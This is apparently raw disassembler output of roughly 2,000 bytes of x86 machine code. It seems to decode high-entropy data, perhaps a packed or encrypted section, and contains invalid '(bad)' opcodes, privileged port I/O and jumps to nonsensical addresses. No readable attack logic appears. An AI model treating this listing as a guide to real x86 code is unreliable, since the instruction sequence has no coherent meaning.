  413333:	lock ja 0x413372
  413336:	dec    edx
  413337:	xchg   esp,eax
  413338:	add    ah,BYTE PTR [esi+0x5839ce39]
  41333e:	cmp    eax,0xb957555f
  413343:	xchg   esp,ebx
  413345:	fadd   DWORD PTR [esi]
  413347:	mov    edx,DWORD PTR [edi]
  413349:	idiv   dl
  41334b:	adc    eax,0xf3d796da
  413350:	mov    edi,esp
  413352:	adc    BYTE PTR [esi],bl
  413354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413355:	mov    dh,0x43
  413357:	and    bl,bl
  413359:	push   esp
  41335a:	daa    
  41335b:	adc    DWORD PTR [edx],ebx
  41335d:	inc    ebx
  41335e:	mov    al,0xab
  413360:	jmp    0x819eb1b7
  413365:	mov    ebx,0xed706433
  41336a:	lods   eax,DWORD PTR ds:[esi]
  41336b:	enter  0x2e8d,0xc
  41336f:	push   0x44
  413371:	add    eax,0xe8ff27bf
  413376:	rol    DWORD PTR [esp+ebx*4+0x406d8aa5],cl
  41337d:	arpl   WORD PTR [bp+di+0xc],dx
  413381:	out    0x36,eax
  413383:	lods   eax,DWORD PTR ds:[esi]
  413384:	or     DWORD PTR [edx],edi
  413386:	scas   eax,DWORD PTR es:[edi]
  413387:	dec    esi
  413388:	or     DWORD PTR [edx+0x78afc748],edx
  41338e:	pop    ss
  41338f:	jl     0x4133ca
  413391:	push   edi
  413392:	shr    esp,cl
  413394:	inc    eax
  413395:	stos   BYTE PTR es:[edi],al
  413396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413397:	fcomp  QWORD PTR [eax+0x3b]
  41339a:	in     eax,0x7b
  41339c:	xor    BYTE PTR [edx],al
  41339e:	push   ds
  41339f:	push   edi
  4133a0:	not    eax
  4133a2:	mov    esi,0x579e6afe
  4133a7:	xchg   ebx,eax
  4133a8:	in     eax,dx
  4133a9:	stos   BYTE PTR es:[edi],al
  4133aa:	pop    ebp
  4133ab:	jecxz  0x41334e
  4133ad:	sbb    DWORD PTR [eax],0x4
  4133b0:	and    DWORD PTR [ecx+0x4a],ebp
  4133b3:	push   eax
  4133b4:	push   eax
  4133b5:	cmc    
  4133b6:	(bad)  
  4133b7:	mov    ds,WORD PTR [esi]
  4133b9:	loope  0x413420
  4133bb:	(bad)  
  4133bc:	sub    eax,0x5320a524
  4133c1:	mov    ah,0x4b
  4133c3:	sub    bl,bh
  4133c5:	iret   
  4133c6:	cmp    dh,cl
  4133c8:	sahf   
  4133c9:	jecxz  0x41342d
  4133cb:	mov    esp,DWORD PTR [edx-0x72568367]
  4133d1:	pop    edi
  4133d2:	sub    bl,dl
  4133d4:	or     DWORD PTR [ebp+0x4dc1bdd2],ebx
  4133da:	pop    eax
  4133db:	push   0xffffffc4
  4133dd:	mov    dh,0x4
  4133df:	(bad)  
  4133e0:	fadd   QWORD PTR [edi-0x33ab8335]
  4133e6:	mov    edx,0x701f5802
  4133eb:	fwait
  4133ec:	aaa    
  4133ed:	out    0x49,al
  4133ef:	jg     0x4133ad
  4133f1:	stos   DWORD PTR es:[edi],eax
  4133f2:	lock adc bl,BYTE PTR [ecx]
  4133f5:	cmp    dl,BYTE PTR [ebx+0x3ba3a44c]
  4133fb:	jp     0x413474
  4133fd:	mov    esi,0x3eb8cdec
  413402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413403:	mov    ss,esi
  413405:	push   ebx
  413406:	enter  0x3e10,0x9e
  41340a:	leave  
  41340b:	inc    edi
  41340c:	(bad)  
  41340d:	mov    ebx,0x6bec66b2
  413412:	sbb    DWORD PTR [ebx-0x6f53ccd9],esi
  413418:	mov    edx,0xee8d1b33
  41341d:	bound  eax,QWORD PTR [eax+0x78]
  413420:	xchg   edi,eax
  413421:	push   0x74b267d9
  413426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413427:	daa    
  413428:	(bad)  
  41342a:	mov    ecx,0x7f4ca566
  41342f:	out    dx,eax
  413430:	aad    0x36
  413432:	push   ebx
  413433:	cdq    
  413434:	lds    edx,FWORD PTR [edi]
  413436:	xchg   ebp,eax
  413437:	dec    eax
  413438:	stos   BYTE PTR es:[edi],al
  413439:	sbb    al,0x8c
  41343b:	jle    0x4133c3
  41343d:	loopne 0x413408
  41343f:	pushf  
  413440:	and    edi,0xb825933
  413446:	adc    ebx,DWORD PTR [ecx-0x359822b8]
  41344c:	pop    ss
  41344d:	cmp    DWORD PTR [ebx+0x146affce],esp
  413453:	mov    dl,0xe8
  413455:	add    BYTE PTR [esi],bh
  413457:	ror    BYTE PTR [edi+0x4d],1
  41345a:	hlt    
  41345b:	mov    ds:0x64f49a68,eax
  413460:	not    esi
  413462:	sub    esp,DWORD PTR [edx+0x9]
  413465:	inc    ebx
  413466:	retf   0xedd9
  413469:	in     eax,0x7e
  41346b:	fwait
  41346c:	sbb    esi,DWORD PTR [esi-0x27]
  41346f:	sub    BYTE PTR [esi-0x37],al
  413472:	outs   dx,DWORD PTR ds:[esi]
  413474:	dec    ebx
  413475:	pop    ebp
  413476:	add    ecx,DWORD PTR [ebp+0x21]
  413479:	icebp  
  41347a:	sub    eax,0x9ec8b879
  41347f:	jg     0x4134ca
  413481:	xor    eax,0x3b09a6a2
  413486:	dec    ecx
  413487:	imul   esp,DWORD PTR [ebp-0x42f4479d],0x52
  41348e:	(bad)  [edi+0x644f6a31]
  413494:	xor    al,dh
  413496:	add    al,0x54
  413498:	add    esi,DWORD PTR [ecx-0x7944212]
  41349e:	inc    eax
  41349f:	mov    eax,ds:0x5e5beee5
  4134a4:	xor    DWORD PTR [ebp+ebp*8-0x6d],ebp
  4134a8:	ror    BYTE PTR [ebx],cl
  4134aa:	sbb    edi,ecx
  4134ac:	test   DWORD PTR [ebp+0x1a418fea],ecx
  4134b2:	clc    
  4134b3:	inc    esp
  4134b4:	jnp    0x4134d2
  4134b6:	ds xchg esp,eax
  4134b8:	daa    
  4134b9:	mov    ds:0xdc26c296,eax
  4134be:	add    BYTE PTR [ebp-0x5f],al
  4134c1:	stc    
  4134c2:	or     al,0x6e
  4134c4:	pop    ecx
  4134c5:	push   es
  4134c6:	mov    eax,0xf8615cf9
  4134cb:	jp     0x41351b
  4134cd:	lods   eax,DWORD PTR ds:[esi]
  4134ce:	arpl   WORD PTR [edi*8+0x6edd50a8],cx
  4134d5:	loop   0x4134ee
  4134d7:	test   BYTE PTR [eax-0x4e],0xfe
  4134db:	mov    edi,0x1384e15d
  4134e0:	push   edi
  4134e1:	mov    DWORD PTR [ecx-0x294194d0],edi
  4134e7:	int    0x6a
  4134e9:	adc    eax,0xffa41fc8
  4134ee:	fs mov edx,0x2c3e005e
  4134f4:	add    BYTE PTR [ecx-0x53815e31],al
  4134fa:	mov    bh,dh
  4134fc:	mov    edx,ds
  4134fe:	add    DWORD PTR [ecx+0x5b13f658],ebp
  413504:	sbb    esp,DWORD PTR [ebx+eiz*2+0x1c99a0ff]
  41350b:	aas    
  41350c:	out    dx,al
  41350d:	cmp    al,0x8e
  41350f:	xor    al,0x3d
  413511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413512:	sbb    eax,0xfffffffa
  413515:	inc    esp
  413516:	sub    BYTE PTR [ebx-0x46],0x91
  41351a:	sbb    esi,edi
  41351c:	push   cs
  41351d:	push   ebp
  41351e:	mov    al,0x41
  413520:	mov    ebx,cs
  413522:	(bad)  [eax]
  413524:	aam    0x1b
  413526:	xor    BYTE PTR [edi+0x4b],0x82
  41352a:	stc    
  41352b:	out    dx,al
  41352c:	loopne 0x413548
  41352e:	fldenv [eax-0xe]
  413531:	pop    ecx
  413532:	jns    0x413573
  413534:	mov    WORD PTR [ebp-0x1c64a6f6],?
  41353a:	les    ebp,FWORD PTR [edi+0x7b]
  41353d:	xchg   esp,edx
  41353f:	out    0xb6,al
  413541:	mov    eax,esi
  413543:	mov    dl,0x23
  413545:	push   ds
  413546:	sar    BYTE PTR ds:0xffdc537b,1
  41354c:	out    dx,al
  41354d:	ss push edx
  41354f:	nop
  413550:	sbb    DWORD PTR [edx+0x2e8e966],ebp
  413556:	test   DWORD PTR [eax+esi*2+0x562dc55e],ebx
  41355d:	retf   0xda1e
  413560:	stos   BYTE PTR es:[edi],al
  413561:	fmul   DWORD PTR [edi-0x56abcacd]
  413567:	mov    ds,WORD PTR [edi+edx*4]
  41356a:	or     esi,ecx
  41356c:	fstp   QWORD PTR [ecx]
  41356e:	mov    ecx,0x6d21ff06
  413573:	ret    
  413574:	pushf  
  413575:	mov    ebp,0x66b0ae11
  41357a:	jp     0x4135e5
  41357c:	pop    ds
  41357d:	xor    eax,0x2d6166b1
  413582:	xlat   BYTE PTR ds:[ebx]
  413583:	dec    edi
  413584:	fucomip st,st(2)
  413586:	xchg   edx,eax
  413587:	stos   DWORD PTR es:[edi],eax
  413588:	add    ebp,DWORD PTR [ecx+0x52d4586c]
  41358e:	dec    ebx
  41358f:	in     eax,dx
  413590:	pop    ds
  413591:	mov    cl,0xac
  413593:	test   al,0xb4
  413595:	sbb    ch,al
  413597:	lahf   
  413598:	cmp    ch,0x6f
  41359b:	aas    
  41359c:	in     eax,0x33
  41359e:	mov    bl,0x4a
  4135a0:	cmp    DWORD PTR [ecx],eax
  4135a2:	mov    edx,0x5b2dbc8a
  4135a7:	data16 mov ah,0xb2
  4135aa:	jg     0x4135ef
  4135ac:	mov    ch,0xb7
  4135ae:	test   DWORD PTR [esi-0x7],0xc14dacee
  4135b5:	fstp   TBYTE PTR [ecx+esi*2+0x6c44ff14]
  4135bc:	ja     0x4135c1
  4135be:	adc    al,0xe1
  4135c0:	inc    esi
  4135c1:	(bad)  
  4135c2:	aaa    
  4135c3:	lock ret 0xd51
  4135c7:	dec    esp
  4135c8:	div    DWORD PTR [edi+esi*8+0x62]
  4135cc:	adc    esp,DWORD PTR [ebx+0x2829d1b4]
  4135d2:	adc    DWORD PTR [esi-0x1c],esp
  4135d5:	cli    
  4135d6:	mov    esp,0x3ad34d8a
  4135db:	ins    BYTE PTR es:[edi],dx
  4135dc:	mov    cl,0xc8
  4135de:	pop    ebp
  4135df:	and    eax,0x59204a79
  4135e4:	stc    
  4135e5:	mov    dh,0xf2
  4135e7:	jp     0x413627
  4135e9:	(bad)  [edi+ebx*2+0x2b]
  4135ed:	les    ecx,FWORD PTR [ebp-0x45]
  4135f0:	mov    edx,0x7b05bd3c
  4135f5:	icebp  
  4135f6:	scas   al,BYTE PTR es:[edi]
  4135f7:	iret   
  4135f8:	mov    edi,0x10989c25
  4135fd:	push   edx
  4135fe:	pop    esi
  4135ff:	lods   al,BYTE PTR ds:[esi]
  413600:	inc    esi
  413601:	dec    esp
  413602:	jge    0x4135a6
  413604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413605:	mov    bh,0x53
  413607:	mov    esp,0x7660c60a
  41360c:	call   DWORD PTR [ebp+0x243877e3]
  413612:	pop    edi
  413613:	scas   al,BYTE PTR es:[edi]
  413614:	sar    bl,cl
  413616:	(bad)  [ecx+ebx*2+0x28]
  41361a:	outs   dx,BYTE PTR ds:[esi]
  41361b:	ja     0x4135be
  41361d:	cmp    DWORD PTR [ecx+esi*2+0x5a],edi
  413621:	lods   eax,DWORD PTR ds:[esi]
  413622:	inc    ebp
  413623:	cdq    
  413624:	icebp  
  413625:	sub    esp,edi
  413627:	pusha  
  413628:	sar    DWORD PTR [ebx],cl
  41362a:	jmp    0xdd690bc9
  41362f:	mov    ds:0xead63b04,eax
  413634:	rol    esp,0x2
  413637:	jb     0x413673
  413639:	or     DWORD PTR [edi+0x1f],esi
  41363c:	mov    al,0x39
  41363e:	out    dx,al
  41363f:	retf   0x461a
  413642:	add    BYTE PTR [edx],bh
  413644:	jbe    0x413687
  413646:	fs stos DWORD PTR es:[edi],eax
  413648:	jae    0x413687
  41364a:	xor    DWORD PTR [ecx+0x183eed84],0x7b26d5d6
  413654:	ret    
  413655:	loop   0x413682
  413657:	mov    esi,0x9f45ad43
  41365c:	xchg   esp,eax
  41365d:	push   es
  41365e:	xor    DWORD PTR [edx+0x36],esi
  413661:	mov    esi,0xe5668603
  413666:	pusha  
  413667:	push   edi
  413668:	es push ds
  41366a:	sub    eax,DWORD PTR [ebp-0x48]
  41366d:	xor    BYTE PTR [ebp-0x55],cl
  413670:	jb     0x413631
  413672:	call   DWORD PTR [eax+edx*2-0x1e676600]
  413679:	mov    dh,BYTE PTR [edi]
  41367b:	repnz sub BYTE PTR [ebp-0x43d9dbe8],0xdb
  413683:	xchg   BYTE PTR [ecx],ah
  413685:	ins    DWORD PTR es:[edi],dx
  413686:	sub    eax,DWORD PTR [edi]
  413688:	cli    
  413689:	outs   dx,DWORD PTR ds:[esi]
  41368a:	retf   
  41368b:	pop    ecx
  41368c:	lock (bad) 
  41368e:	mov    ah,0x3a
  413690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413691:	pop    eax
  413692:	loopne 0x413659
  413694:	in     al,dx
  413695:	pushf  
  413696:	xor    edi,edx
  413698:	jbe    0x413635
  41369a:	mov    WORD PTR [eax+ebp*1],bx
  41369e:	aad    0xdc
  4136a0:	inc    edx
  4136a1:	aaa    
  4136a2:	xor    al,0xfe
  4136a4:	shl    BYTE PTR [edi],cl
  4136a6:	add    al,0x6a
  4136a8:	shl    BYTE PTR [edx-0x555f49cf],cl
  4136ae:	outs   dx,DWORD PTR ds:[esi]
  4136af:	xor    cl,dh
  4136b1:	xchg   ecx,eax
  4136b2:	imul   ecx,DWORD PTR ds:0xb7bb469e,0x63
  4136b9:	mov    bh,ch
  4136bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136bc:	pop    ebp
  4136bd:	rcl    BYTE PTR [ebp-0x530b59cb],cl
  4136c3:	sbb    ebp,DWORD PTR [esi+0x3d94bbf2]
  4136c9:	out    0xeb,eax
  4136cb:	fdivr  DWORD PTR [edi]
  4136cd:	mov    esp,0x862a8a2c
  4136d2:	fwait
  4136d3:	dec    ebx
  4136d4:	mov    dl,0x7f
  4136d6:	iret   
  4136d7:	inc    eax
  4136d8:	pop    ebp
  4136d9:	in     eax,0xb9
  4136db:	ins    BYTE PTR es:[edi],dx
  4136dc:	enter  0x5f94,0x2e
  4136e0:	aam    0x22
  4136e2:	pop    edx
  4136e3:	nop
  4136e4:	clc    
  4136e5:	inc    edi
  4136e6:	cmp    edi,edx
  4136e8:	xchg   BYTE PTR [ebx],al
  4136ea:	adc    BYTE PTR [eax+0x33],cl
  4136ed:	out    dx,al
  4136ee:	pushf  
  4136ef:	js     0x413762
  4136f1:	sub    eax,0xfd3c0480
  4136f6:	xlat   BYTE PTR ds:[ebx]
  4136f7:	xor    al,0x98
  4136f9:	stc    
  4136fa:	in     eax,0x5d
  4136fc:	mov    eax,ds:0x9992f9cf
  413701:	test   al,0x6f
  413703:	xchg   edx,eax
  413704:	ret    
  413705:	lock lods al,BYTE PTR ds:[esi]
  413707:	out    0x19,al
  413709:	mov    esi,ecx
  41370b:	xchg   BYTE PTR [eax+ebp*8],ah
  41370e:	aam    0xa5
  413710:	jecxz  0x413736
  413712:	cmp    BYTE PTR [esi+0x2a],ah
  413715:	rcl    DWORD PTR [ebx],0xee
  413718:	pop    esp
  413719:	(bad)  
  41371a:	mov    bl,0x12
  41371c:	stc    
  41371d:	pop    edx
  41371e:	mov    edx,0x30b21086
  413723:	or     al,0x4e
  413725:	shufps xmm6,XMMWORD PTR [edi+0x1c],0x99
  41372a:	inc    ebx
  41372b:	sbb    dl,al
  41372d:	add    eax,0x5290540f
  413732:	and    ecx,DWORD PTR [esi]
  413734:	pushf  
  413735:	out    dx,eax
  413736:	mov    ds:0x58e7121e,al
  41373b:	and    DWORD PTR [ecx+0x475a39eb],0x46
  413742:	cmp    ch,ch
  413744:	jns    0x41374a
  413746:	out    0x27,al
  413748:	pop    esi
  413749:	cmc    
  41374a:	imul   BYTE PTR [ecx+esi*2]
  41374d:	aad    0xd8
  41374f:	mov    dh,0x7f
  413751:	jae    0x413778
  413753:	jmp    0x41372c
  413755:	or     al,0xc4
  413757:	iret   
  413758:	cdq    
  413759:	inc    ecx
  41375a:	bound  esi,QWORD PTR [esi+ebx*1]
  41375d:	repz call 0x3e3e7a13
  413763:	inc    esi
  413764:	jo     0x413762
  413766:	mov    edx,0x80c455ed
  41376b:	and    BYTE PTR [ebp+ebp*4+0x24],0x8a
  413770:	pop    ebp
  413771:	mov    ebp,0x7b1ada1e
  413776:	pop    esi
  413777:	rcl    DWORD PTR [edx+0x9],0xcf
  41377b:	data16 xchg BYTE PTR [edx-0x5c],dl
  41377f:	jl     0x4137db
  413781:	push   ss
  413782:	jns    0x413759
  413784:	mov    ah,0xee
  413786:	scas   al,BYTE PTR es:[edi]
  413787:	mov    edx,0xb1f370f2
  41378c:	jle    0x413721
  41378e:	rol    ebx,0x59
  413791:	jae    0x41378c
  413793:	adc    BYTE PTR [ecx+0x781dbeef],0x8a
  41379a:	inc    eax
  41379b:	loopne 0x4137bc
  41379d:	mov    bl,0x76
  41379f:	ins    BYTE PTR es:[edi],dx
  4137a0:	daa    
  4137a1:	loop   0x41379c
  4137a3:	out    0x70,eax
  4137a5:	push   esi
  4137a6:	call   0xe7a9:0x2201e5ea
  4137ad:	mov    dh,0xf0
  4137af:	xchg   edi,eax
  4137b0:	mov    ds:0x46ad9cd0,eax
  4137b5:	mov    BYTE PTR fs:[ecx-0x735e21c0],dh
  4137bc:	jae    0x4137fa
  4137be:	(bad)  
  4137bf:	jo     0x4137ec
  4137c1:	pop    esp
  4137c2:	xchg   edx,eax
  4137c3:	jno    0x41376c
  4137c5:	rcl    BYTE PTR [edi-0xd],1
  4137c8:	add    ebx,esi
  4137ca:	mov    dl,0x40
  4137cc:	push   0x74
  4137ce:	imul   ecx,DWORD PTR [edx-0x3a],0x16
  4137d2:	fidiv  WORD PTR [ebp+0x56]
  4137d5:	pop    ecx
  4137d6:	cld    
  4137d7:	loope  0x413769
  4137d9:	adc    al,0x54
  4137db:	repnz mov dh,0x7a
  4137de:	cld    
  4137df:	add    eax,0x35c50942
  4137e4:	jnp    0x413821
  4137e6:	adc    DWORD PTR [esi+0xe],ecx
  4137e9:	js     0x413857
  4137eb:	push   ds
  4137ec:	jns    0x41382c
  4137ee:	aad    0xe1
  4137f0:	xchg   ebp,eax
  4137f1:	add    DWORD PTR [ecx-0x12],edx
  4137f4:	call   0xfff6:0xf9c64cc6
  4137fb:	mov    esp,0xd3746221
  413800:	push   ebp
  413801:	jge    0x413837
  413803:	jl     0x4137b8
  413805:	jne    0x413867
  413807:	add    DWORD PTR [esi-0x35],ebx
  41380a:	enter  0x5d0c,0x48
  41380e:	stos   DWORD PTR es:[edi],eax
  41380f:	sub    edi,ecx
  413811:	enter  0x6d46,0x4a
  413815:	jnp    0x4137c6
  413817:	mov    eax,ds:0xf895b315
  41381c:	int    0xd0
  41381e:	sub    al,0x76
  413820:	jo     0x413830
  413822:	push   edx
  413823:	or     BYTE PTR [ebx+0x8],bh
  413826:	pop    esi
  413827:	push   eax
  413828:	cmp    BYTE PTR [eax+0x63cdb9d7],ah
  41382e:	add    BYTE PTR [ecx+0x383d8ac0],dh
  413834:	push   ecx
  413835:	and    edi,DWORD PTR [ecx-0x4b]
  413838:	ror    BYTE PTR [edx+0x335c0260],cl
  41383e:	and    DWORD PTR [ecx+0x8094763],ebx
  413844:	mov    eax,ds:0x5751103f
  413849:	shl    ebx,1
  41384b:	mov    ecx,0x6c42d74f
  413850:	push   ds
  413851:	ficom  DWORD PTR [edx-0x25]
  413854:	addr16 js 0x413889
  413857:	or     dl,ah
  413859:	test   BYTE PTR [ecx+0xe5048a9],al
  41385f:	xor    al,0x94
  413861:	out    dx,al
  413862:	push   0xffffffe0
  413864:	or     al,0x96
  413866:	(bad)  ds:0x7f853ad0
  41386c:	es jg  0x41386f
  41386f:	hlt    
  413870:	or     DWORD PTR [ecx+edi*2+0x6b],edi
  413874:	pop    ds
  413875:	and    BYTE PTR [esi+0x39],0x34
  413879:	js     0x413897
  41387b:	sbb    ecx,DWORD PTR [ebx+0x59]
  41387e:	loope  0x4138e8
  413880:	xor    eax,0xc3403fe0
  413885:	add    al,BYTE PTR [edx]
  413887:	(bad)  
  413889:	ror    ah,0xca
  41388c:	xor    eax,0x69af636
  413891:	cmp    BYTE PTR [esi+0x58],bl
  413894:	outs   dx,DWORD PTR ds:[esi]
  413895:	adc    edi,edi
  413897:	enter  0xce5,0xe1
  41389b:	mov    ebp,0xb34e76fd
  4138a0:	inc    esp
  4138a1:	xlat   BYTE PTR ds:[ebx]
  4138a2:	jnp    0x413842
  4138a4:	fdivr  DWORD PTR [esi-0x6df5d93f]
  4138aa:	jb     0x4138ef
  4138ac:	jge    0x4138f7
  4138ae:	ja     0x413848
  4138b0:	or     eax,esi
  4138b2:	xchg   DWORD PTR [ebp-0x7ee3caa7],ecx
  4138b8:	jge    0x413850
  4138ba:	xchg   ebx,eax
  4138bb:	xor    al,ah
  4138bd:	sbb    DWORD PTR [edx-0x6a],ebp
  4138c0:	mov    WORD PTR [ebx-0x631d4923],fs
  4138c6:	in     al,dx
  4138c7:	dec    edi
  4138c8:	inc    eax
  4138c9:	es nop
  4138cb:	stos   BYTE PTR es:[edi],al
  4138cc:	xchg   BYTE PTR [ebx+0x55],dh
  4138cf:	dec    eax
  4138d0:	sbb    DWORD PTR [ebx+0x4ec1500c],edi
  4138d6:	in     eax,0x93
  4138d8:	(bad)  
  4138db:	fisub  WORD PTR [edi-0x34]
  4138de:	scas   al,BYTE PTR es:[edi]
  4138df:	jmp    0x413887
  4138e1:	cli    
  4138e2:	enter  0x9170,0x23
  4138e6:	into   
  4138e7:	sub    eax,0x84862c21
  4138ec:	mov    ecx,0x1e24c2eb
  4138f1:	xor    DWORD PTR [esp+ebx*8-0x17198f58],ebp
  4138f8:	lahf   
  4138f9:	out    0xbd,eax
  4138fb:	arpl   WORD PTR [ebp-0x3ab637f5],bx
  413901:	(bad)  
  413902:	mov    dl,0x14
  413904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413905:	sub    eax,0xdcc6950f
  41390a:	and    edi,DWORD PTR [esi]
  41390c:	test   al,0xff
  41390e:	enter  0xf6ab,0xe1
  413912:	adc    al,0x7
  413914:	test   DWORD PTR [ecx+0x3],0xf587f019
  41391b:	std    
  41391c:	stos   DWORD PTR es:[edi],eax
  41391d:	cli    
  41391e:	iret   
  41391f:	call   0x6f7d:0x8176ef34
  413926:	imul   BYTE PTR [eax+0x3c]
  413929:	jo     0x4138ba
  41392b:	popa   
  41392c:	popa   
  41392d:	je     0x41390f
  41392f:	clc    
  413930:	pushf  
  413931:	mov    ebp,DWORD PTR [eax-0xe]
  413934:	pop    ds
  413935:	pop    eax
  413936:	add    DWORD PTR [eax+eax*8],0x6d4f0b0b
  41393d:	cmc    
  41393e:	ret    
  41393f:	mov    DWORD PTR [ecx],ebx
  413941:	mov    ah,0x53
  413943:	fadd   QWORD PTR [ebp-0x3140dd8c]
  413949:	ss mov edi,0x77a2b15a
  41394f:	test   eax,0xb1cd0788
  413954:	(bad)  
  413956:	add    eax,0xb019ffa3
  41395b:	mov    ebx,0x9c3089ca
  413960:	add    DWORD PTR [ebx+0x673809b0],0x732f2074
  41396a:	stos   BYTE PTR es:[edi],al
  41396b:	out    0xb8,eax
  41396d:	mov    ah,0xa4
  41396f:	sahf   
  413970:	fldenv [ecx]
  413972:	into   
  413973:	push   ebx
  413974:	mov    esi,0xbb5453b4
  413979:	push   ds
  41397a:	add    DWORD PTR [edi],0x4a
  41397d:	out    dx,eax
  41397e:	js     0x413904
  413980:	and    BYTE PTR [esi+0x1c0a453],dh
  413986:	daa    
  413987:	ins    DWORD PTR es:[edi],dx
  413988:	mov    BYTE PTR [ecx+ebx*2],ah
  41398b:	xor    bl,0x83
  41398e:	push   ebp
  41398f:	push   edi
  413990:	push   esi
  413991:	fbstp  TBYTE PTR [eax]
  413993:	sbb    ebp,DWORD PTR [ebp-0x66]
  413996:	pop    edx
  413997:	enter  0x812a,0xdb
  41399b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41399c:	outs   dx,BYTE PTR ds:[esi]
  41399d:	jmp    0xc950:0x3d9c07f2
  4139a4:	(bad)  
  4139a5:	out    0x1f,al
  4139a7:	push   edx
  4139a8:	xor    dh,BYTE PTR [edx-0x3e66248b]
  4139ae:	outs   dx,BYTE PTR ds:[esi]
  4139af:	push   edx
  4139b0:	sar    al,1
  4139b2:	(bad)  
  4139b4:	(bad)  
  4139b5:	mov    bl,0x8e
  4139b7:	sbb    bh,BYTE PTR [edx-0x61e666f7]
  4139bd:	adc    al,0x4a
  4139bf:	adc    ecx,DWORD PTR [ecx-0x35]
  4139c2:	fiadd  WORD PTR [ebp-0x5c]
  4139c5:	test   BYTE PTR [ecx-0x3223847c],ah
  4139cb:	mov    al,0x9
  4139cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ce:	stos   BYTE PTR es:[edi],al
  4139cf:	fsubr  DWORD PTR ds:0x6440c3fd
  4139d5:	(bad)  
  4139d6:	pushf  
  4139d7:	scas   eax,DWORD PTR es:[edi]
  4139d8:	cmc    
  4139d9:	and    eax,0xd7010d41
  4139de:	jmp    0x413a5d
  4139e0:	sub    eax,0xccf50728
  4139e5:	aas    
  4139e6:	(bad)  
  4139e7:	outs   dx,DWORD PTR ds:[esi]
  4139e8:	(bad)  
  4139e9:	xchg   DWORD PTR es:[esi],eax
  4139ec:	ins    BYTE PTR es:[edi],dx
  4139ed:	xor    ch,BYTE PTR [esp+ebp*8+0x517fa3e3]
  4139f4:	sbb    DWORD PTR [ecx],edi
  4139f6:	add    DWORD PTR [edi-0x7e],ecx
  4139f9:	leave  
  4139fa:	jae    0x4139b6
  4139fc:	fisttp DWORD PTR [esi]
  4139fe:	cmp    dl,BYTE PTR [esi-0x1a]
  413a01:	cdq    
  413a02:	push   0x9813328f
  413a07:	add    ebx,DWORD PTR [ecx+0x370b0129]
  413a0d:	jae    0x413a13
  413a0f:	cs aad 0x49
  413a12:	in     al,0x48
  413a14:	sbb    eax,0xf3d28782
  413a19:	push   cs
  413a1a:	adc    eax,0xcf6def14
  413a1f:	repnz mov WORD PTR [eax*8-0x4fd6cbe8],ds
  413a27:	int    0xcf
  413a29:	mov    esp,0x3bd43afc
  413a2e:	enter  0x571,0x2
  413a32:	cmp    DWORD PTR [esi+0x62],ebx
  413a35:	aad    0x19
  413a37:	sub    al,0x59
  413a39:	popf   
  413a3a:	test   al,0x36
  413a3c:	retf   0x3d27
  413a3f:	imul   edi,DWORD PTR [ebp+0x941fed3],0x607fafca
  413a49:	adc    ch,dh
  413a4b:	in     eax,dx
  413a4c:	xor    al,0x9
  413a4e:	jg     0x4139de
  413a50:	adc    al,0x54
  413a52:	scas   al,BYTE PTR es:[edi]
  413a53:	sbb    al,0x88
  413a55:	or     esp,DWORD PTR [ecx+0x560e59f6]
  413a5b:	sbb    al,0x30
  413a5d:	jbe    0x4139f8
  413a5f:	mov    bl,0xb6
  413a61:	dec    eax
  413a62:	pop    esi
  413a63:	push   es
  413a64:	in     al,0xa
  413a66:	clc    
  413a67:	outs   dx,BYTE PTR ds:[esi]
  413a68:	inc    edx
  413a69:	jne    0x413ac6
  413a6b:	add    eax,0xa39d188d
  413a70:	jnp    0x413a81
  413a72:	out    dx,eax
  413a73:	dec    edi
  413a74:	retf   
  413a75:	xor    dh,BYTE PTR [edi]
  413a77:	ds ins DWORD PTR es:[edi],dx
  413a79:	jnp    0x413a5d
  413a7b:	test   eax,0x3e72c8b0
  413a80:	jmp    0x2087:0xcc25596e
  413a87:	add    esi,DWORD PTR [esi]
  413a89:	xor    DWORD PTR fs:[ebx],edx
  413a8c:	rcr    DWORD PTR [ebx+0x771dbb8f],1
  413a92:	ror    DWORD PTR [esi+0x1f],1
  413a95:	mov    dl,0xcf
  413a97:	inc    ecx
  413a98:	hlt    
  413a99:	enter  0x54ea,0xac
  413a9d:	fiadd  DWORD PTR [ebx-0x69]
  413aa0:	test   esp,edx
  413aa2:	sub    DWORD PTR [ebx+0x1a3cdb7c],edi
  413aa8:	xor    DWORD PTR [edi-0x2d],eax
  413aab:	outs   dx,DWORD PTR ds:[esi]
  413aac:	xchg   ebx,eax
  413aad:	cmp    BYTE PTR [esi],0x87
  413ab0:	pop    edi
  413ab1:	jle    0x413a45
  413ab3:	and    edi,DWORD PTR [eax+0x3a20872b]
  413ab9:	mov    edi,gs
  413abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413abc:	jmp    0x4d1bab10
  413ac1:	adc    BYTE PTR [ebp+0x68bfe0cf],dh
  413ac7:	mov    ds:0x60b98173,eax
  413acc:	and    ebp,DWORD PTR [ebp-0x33]
  413acf:	sbb    dh,BYTE PTR [eax-0x12]
  413ad2:	inc    edi
  413ad3:	retf   0x813f
  413ad6:	lea    edi,[ebx]
  413ad8:	test   al,0x4b
  413ada:	jmp    0x745e974b
  413adf:	add    eax,0x64ace89d
  413ae4:	cmp    DWORD PTR [eax+0x4d24885f],edx
  413aea:	int3   
  413aeb:	scas   al,BYTE PTR es:[edi]
  413aec:	loopne 0x413b44
  413aee:	and    DWORD PTR [edx-0x28],ebx
  413af1:	lods   al,BYTE PTR ds:[esi]
  413af2:	test   eax,0xcadfe461
  413af7:	dec    ecx
  413af8:	bound  eax,QWORD PTR [esi-0xeee185]
  413afe:	out    0xdf,al
  413b00:	fnstcw WORD PTR [esi-0x7168bb7f]
  413b06:	scas   eax,DWORD PTR es:[edi]
  413b07:	fcomp  DWORD PTR [ebx]
  413b09:	mov    DWORD PTR [edi],eax
  413b0b:	or     eax,0x85ca22cc
